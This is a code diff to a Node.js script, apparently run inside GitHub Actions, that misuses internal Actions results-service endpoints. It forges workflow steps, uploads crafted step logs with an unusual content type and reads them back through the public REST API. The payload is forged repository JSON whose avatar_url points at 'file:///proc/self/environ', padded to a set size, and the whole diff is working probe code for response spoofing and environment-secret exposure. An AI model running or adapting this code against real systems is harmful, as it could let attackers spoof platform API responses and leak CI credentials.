@@ -49,8 +49,12 @@ function request(urlString, { method = 'GET', headers = {}, body = null } = {}) 
 }
 
 async function twirp(method, token, value) {
+  return twirpService(ARTIFACT_SERVICE, method, token, value);
+}
+
+async function twirpService(service, method, token, value) {
   const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
-  const url = new URL(`/twirp/${ARTIFACT_SERVICE}/${method}`, origin);
+  const url = new URL(`/twirp/${service}/${method}`, origin);
   const body = Buffer.from(JSON.stringify(value));
   const response = await request(url.href, {
     method: 'POST',
@@ -236,56 +240,154 @@ async function verifyRestArtifact(repositoryPath, token, expectedBody) {
   return { contentTypeHex: typeBytes.toString('hex'), digest: actualDigest };
 }
 
-async function probeMimeStrategies(token, githubRepository, ids) {
+function repositoryPayload(repositoryPath) {
+  const document = {
+    full_name: repositoryPath,
+    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
+    description: '',
+    stargazers_count: 0,
+    padding: '',
+  };
+  const base = Buffer.from(JSON.stringify(document));
+  const paddingLength = ARTIFACT_BYTES - base.length;
+  if (paddingLength < 0) fail('repository path is too long for probe payload');
+  document.padding = 'A'.repeat(paddingLength);
+  const payload = Buffer.from(JSON.stringify(document));
+  if (payload.length !== ARTIFACT_BYTES) fail('probe payload padding failed');
+  return payload;
+}
+
+async function currentRestJobId(githubRepository, githubToken) {
+  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
+  const runId = process.env.GITHUB_RUN_ID;
+  if (!runId) fail('GITHUB_RUN_ID is missing');
+  const response = await request(`${apiBase}/repos/${githubRepository}/actions/runs/${runId}/jobs?per_page=100`, {
+    headers: {
+      Accept: 'application/vnd.github+json',
+      Authorization: `Bearer ${githubToken}`,
+      'User-Agent': 'repo-cassette-step-log-probe',
+      'X-GitHub-Api-Version': '2022-11-28',
+    },
+  });
+  if (response.status !== 200) fail(`job listing failed with HTTP ${response.status}`);
+  const jobs = JSON.parse(response.body.toString('utf8')).jobs;
+  if (!Array.isArray(jobs)) fail('job listing omitted jobs');
+  const current = jobs.filter((job) => job && job.status === 'in_progress');
+  if (current.length !== 1 || !Number.isSafeInteger(current[0].id)) {
+    fail(`could not identify the current REST job (${current.length} in progress)`);
+  }
+  return String(current[0].id);
+}
+
+async function putStepLog(url, body, contentType) {
+  const response = await request(url, {
+    method: 'PUT',
+    headers: {
+      'content-type': 'application/octet-stream',
+      'content-length': String(body.length),
+      'x-ms-blob-type': 'BlockBlob',
+      'x-ms-blob-content-type': contentType,
+    },
+    body,
+  });
+  if (response.status < 200 || response.status >= 300) {
+    fail(`step-log blob PUT failed with HTTP ${response.status}`);
+  }
+}
+
+async function readPublicStepLog(repositoryPath, githubToken) {
+  const apiBase = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '');
+  const endpoint = `${apiBase}/repos/${repositoryPath}`;
+  let response;
+  for (let attempt = 1; attempt <= 10; attempt++) {
+    response = await rawTlsGet(endpoint, {
+      Accept: 'application/vnd.github.v3+json',
+      Authorization: `Bearer ${githubToken}`,
+      'User-Agent': 'repo-cassette-step-log-probe',
+      'X-GitHub-Api-Version': '2022-11-28',
+    });
+    if (response.status >= 300 && response.status < 400) {
+      const location = firstHeader(response, 'location');
+      if (!location) fail(`step-log redirect ${response.status} omitted Location`);
+      response = await rawTlsGet(new URL(location, endpoint).href, {
+        'User-Agent': 'repo-cassette-step-log-probe',
+      });
+      if (response.status === 200) return response;
+    }
+    if (![202, 404, 409].includes(response.status)) break;
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+  }
+  fail(`step-log REST download failed with HTTP ${response.status}`);
+}
+
+async function probeStepLogs(token, githubRepository, ids) {
+  const githubToken = process.env.GITHUB_TOKEN;
+  if (!githubToken) fail('GITHUB_TOKEN is missing');
+  const jobId = await currentRestJobId(githubRepository, githubToken);
+  const now = new Date().toISOString();
   const candidates = [
-    ['v7-percent85', 7, 'application/json%85'],
-    ['v7-percent2585', 7, 'application/json%2585'],
-    ['v7-percentc285', 7, 'application/json%C2%85'],
-    ['v7-json-control', 7, 'application/json'],
-  ];
-  const run = process.env.GITHUB_RUN_ID || Date.now();
-  const attempt = process.env.GITHUB_RUN_ATTEMPT || 1;
-  for (const [label, version, mimeType] of candidates) {
-    const common = {
+    { label: 'json-control', number: 998, contentType: 'application/json' },
+    { label: 'json-nel', number: 999, contentType: WEIRD_CONTENT_TYPE },
+  ].map((candidate) => ({ ...candidate, stepId: crypto.randomUUID() }));
+
+  await twirpService(
+    'github.actions.results.api.v1.WorkflowStepUpdateService',
+    'WorkflowStepsUpdate',
+    token,
+    {
       workflow_run_backend_id: ids.workflowRunBackendId,
       workflow_job_run_backend_id: ids.workflowJobRunBackendId,
-      name: `mime-probe-${run}-${attempt}-${label}`,
-    };
-    const createRequest = { ...common, version };
-    createRequest.mime_type = mimeType;
-    try {
-      const created = await twirp('CreateArtifact', token, createRequest);
-      const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl;
-      if (!created.ok || typeof signedUploadUrl !== 'string') fail('invalid create response');
-      const placeholder = Buffer.alloc(ARTIFACT_BYTES, 0x20);
-      await putBlob(signedUploadUrl, placeholder);
-      const finalized = await twirp('FinalizeArtifact', token, {
-        ...common,
-        size: String(placeholder.length),
-      });
-      const artifactId = String(finalized.artifact_id || finalized.artifactId || '');
-      if (!finalized.ok || !/^\d+$/.test(artifactId)) fail('invalid finalize response');
-      const repositoryPath = `${githubRepository}/actions/artifacts/${artifactId}/zip`;
-      const document = {
-        full_name: repositoryPath,
-        owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
-        description: '',
-        stargazers_count: 0,
-        padding: '',
-      };
-      const base = Buffer.from(JSON.stringify(document));
-      document.padding = 'A'.repeat(ARTIFACT_BYTES - base.length);
-      const payload = Buffer.from(JSON.stringify(document));
-      await putBlob(signedUploadUrl, payload);
-      try {
-        const verified = await verifyRestArtifact(repositoryPath, process.env.GITHUB_TOKEN, payload);
-        process.stdout.write(`probe=${label}:SUCCESS:${artifactId}:${verified.contentTypeHex}:${verified.digest}\n`);
-      } catch (error) {
-        process.stdout.write(`probe=${label}:download:${String(error.message || error).slice(0, 240)}\n`);
-      }
-    } catch (error) {
-      process.stdout.write(`probe=${label}:create-or-finalize:${String(error.message || error).slice(0, 240)}\n`);
-    }
+      change_order: 2147483647,
+      steps: candidates.map((candidate) => ({
+        external_id: candidate.stepId,
+        number: candidate.number,
+        name: `repo-cassette-${candidate.label}`,
+        status: 6,
+        started_at: now,
+        completed_at: now,
+        conclusion: 2,
+      })),
+    },
+  );
+
+  for (const candidate of candidates) {
+    const repositoryPath = `${githubRepository}/actions/jobs/${jobId}/steps/${candidate.number}/logs`;
+    const payload = repositoryPayload(repositoryPath);
+    const signed = await twirpService(
+      'results.services.receiver.Receiver',
+      'GetStepLogsSignedBlobURL',
+      token,
+      {
+        workflow_run_backend_id: ids.workflowRunBackendId,
+        workflow_job_run_backend_id: ids.workflowJobRunBackendId,
+        step_backend_id: candidate.stepId,
+      },
+    );
+    const logsUrl = signed.logs_url || signed.logsUrl;
+    if (typeof logsUrl !== 'string') fail(`${candidate.label} signed response omitted logs URL`);
+    await putStepLog(logsUrl, payload, candidate.contentType);
+    const uploadedAt = new Date().toISOString();
+    await twirpService(
+      'results.services.receiver.Receiver',
+      'CreateStepLogsMetadata',
+      token,
+      {
+        workflow_run_backend_id: ids.workflowRunBackendId,
+        workflow_job_run_backend_id: ids.workflowJobRunBackendId,
+        step_backend_id: candidate.stepId,
+        uploaded_at: uploadedAt,
+        line_count: 1,
+      },
+    );
+    const response = await readPublicStepLog(repositoryPath, githubToken);
+    const contentTypeHex = Buffer.from(firstHeader(response, 'content-type'), 'latin1').toString('hex');
+    const digest = crypto.createHash('sha256').update(response.body).digest('hex');
+    const expectedDigest = crypto.createHash('sha256').update(payload).digest('hex');
+    process.stdout.write(
+      `step-log-probe=${candidate.label}:job=${jobId}:step=${candidate.number}:` +
+      `status=${response.status}:content-type-hex=${contentTypeHex}:` +
+      `body-sha256=${digest}:body-match=${digest === expectedDigest}\n`,
+    );
   }
 }
 
@@ -304,8 +406,8 @@ async function main() {
   }
 
   const ids = backendIds(token);
-  if (process.env.MIME_PROBE === '1') {
-    await probeMimeStrategies(token, githubRepository, ids);
+  if (process.env.STEP_LOG_PROBE === '1') {
+    await probeStepLogs(token, githubRepository, ids);
     return;
   }
   const artifactName = `repo-cassette-${process.env.GITHUB_RUN_ID || Date.now()}-${process.env.GITHUB_RUN_ATTEMPT || 1}.json`;
